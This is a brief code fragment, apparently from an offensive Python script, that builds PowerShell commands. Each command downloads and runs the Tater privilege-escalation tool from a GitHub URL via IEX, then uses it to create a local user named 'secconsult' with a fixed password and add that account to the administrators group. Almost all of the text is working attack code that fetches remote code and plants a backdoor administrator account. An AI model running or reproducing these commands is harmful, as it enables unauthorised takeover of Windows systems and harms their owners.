...
powershell_command += "IEX $browser.DownloadString('https://raw.githubusercontent.com/jbarg/Tater/master/Tater.ps1'); Invoke-Tater -Trigger 1 -Command \"net user secconsult Test123! /add\""
powershell_command += "IEX $browser.DownloadString('https://raw.githubusercontent.com/jbarg/Tater/master/Tater.ps1'); Invoke-Tater -Trigger 1 -Command \"net localgroup administrators secconsult /add\""
